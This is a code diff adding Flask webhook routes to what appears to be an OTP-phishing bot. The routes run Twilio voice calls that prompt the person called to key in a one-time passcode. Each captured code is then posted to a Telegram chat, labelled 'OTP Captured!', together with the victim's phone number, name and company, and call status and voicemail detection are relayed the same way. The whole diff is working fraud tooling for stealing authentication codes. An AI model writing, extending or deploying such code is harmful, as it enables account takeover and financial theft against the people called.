@@ -12714,6 +12714,127 @@ def api_bypasser_validate():
     }))
 
 
+@app.route('/voice/otp', methods=['GET', 'POST'])
+def voice_otp():
+    from modules.twilio_call import get_pending_call, build_voice_twiml_main, get_webhook_base
+    token = request.args.get('token', '')
+    data = get_pending_call(token)
+    base = get_webhook_base()
+    twiml = build_voice_twiml_main(token, base, data)
+    return twiml, 200, {'Content-Type': 'text/xml'}
+
+
+@app.route('/voice/gather', methods=['GET', 'POST'])
+def voice_gather():
+    from modules.twilio_call import get_pending_call, build_voice_twiml_gather, get_webhook_base
+    token = request.args.get('token', '')
+    data = get_pending_call(token)
+    digit = request.values.get('Digits', '')
+    base = get_webhook_base()
+    twiml = build_voice_twiml_gather(token, base, data, digit)
+    return twiml, 200, {'Content-Type': 'text/xml'}
+
+
+@app.route('/voice/gatherotp', methods=['GET', 'POST'])
+def voice_gatherotp():
+    import asyncio
+    from modules.twilio_call import get_pending_call, build_voice_twiml_otp_captured, clear_call_data
+    token = request.args.get('token', '')
+    data = get_pending_call(token)
+    otp = request.values.get('Digits', '')
+    lang = data.get('lang', 'en')
+    chat_id = data.get('chat_id', '')
+
+    if otp and chat_id:
+        try:
+            BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
+            if BOT_TOKEN:
+                import requests as _req
+                msg = (
+                    f"🔐 <b>OTP Captured!</b>\n\n"
+                    f"📞 Phone: <code>{data.get('phone', 'N/A')}</code>\n"
+                    f"👤 Name: {data.get('name', 'N/A')}\n"
+                    f"🏢 Company: {data.get('company', 'N/A')}\n"
+                    f"🔑 OTP: <b><code>{otp}</code></b>"
+                )
+                _req.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
+                    timeout=10,
+                )
+        except Exception as e:
+            print(f"[VOICE] Error sending OTP to Telegram: {e}")
+
+    twiml = build_voice_twiml_otp_captured(otp, lang)
+    return twiml, 200, {'Content-Type': 'text/xml'}
+
+
+@app.route('/voice/status', methods=['GET', 'POST'])
+def voice_status():
+    import requests as _req
+    from modules.twilio_call import get_pending_call, get_call_data
+    token = request.args.get('token', '')
+    data = get_pending_call(token)
+    if not data:
+        call_sid = request.values.get('CallSid', '')
+        data = get_call_data(call_sid)
+
+    call_status = request.values.get('CallStatus', '')
+    chat_id = data.get('chat_id', '')
+
+    status_map = {
+        'initiated':  '📡 Call initiated...',
+        'ringing':    '🔔 Phone is ringing...',
+        'answered':   '✅ Call answered!',
+        'completed':  '📴 Call completed.',
+        'busy':       '🔴 Line busy.',
+        'no-answer':  '⚠️ No answer.',
+        'canceled':   '❌ Call canceled.',
+        'failed':     '❌ Call failed.',
+    }
+
+    msg = status_map.get(call_status)
+    if msg and chat_id:
+        try:
+            BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
+            if BOT_TOKEN:
+                _req.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={"chat_id": chat_id, "text": msg},
+                    timeout=10,
+                )
+        except Exception as e:
+            print(f"[VOICE] Error sending status: {e}")
+
+    return '', 204
+
+
+@app.route('/voice/amd', methods=['GET', 'POST'])
+def voice_amd():
+    import requests as _req
+    from modules.twilio_call import get_pending_call, build_voice_twiml_voicemail
+    token = request.args.get('token', '')
+    data = get_pending_call(token)
+    answered_by = request.values.get('AnsweredBy', '')
+    chat_id = data.get('chat_id', '')
+    lang = data.get('lang', 'en')
+
+    if answered_by and answered_by.startswith('machine'):
+        if chat_id:
+            try:
+                BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
+                if BOT_TOKEN:
+                    _req.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        json={"chat_id": chat_id, "text": "📬 Call went to voicemail."},
+                        timeout=10,
+                    )
+            except Exception:
+                pass
+
+    return '', 204
+
+
 def run():
     try:
         from waitress import serve
